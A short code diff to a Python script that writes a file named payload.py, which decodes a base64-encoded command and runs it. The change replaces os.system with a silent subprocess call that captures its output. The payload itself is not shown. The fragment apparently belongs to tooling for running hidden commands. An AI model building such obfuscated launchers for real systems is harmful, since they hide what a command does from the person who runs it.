@@ -12,14 +12,15 @@ payload_bytes = payload.encode('utf-8')
 payload_encoded = base64.b64encode(payload_bytes)
 text = f'''
 #!/bin/python3.9
-import os
+import shlex
 import base64
+from subprocess import Popen, PIPE
 
 payload = {payload_encoded}
 
 execute = base64.b64decode(payload)
 payload_decoded = execute.decode('utf-8')
-os.system(payload_decoded)
+Popen(shlex.split(payload_decoded), stdin=PIPE, stderr=PIPE, stdout=PIPE)
 '''
 with open("payload.py", "w") as thepayload:
     thepayload.write(text)
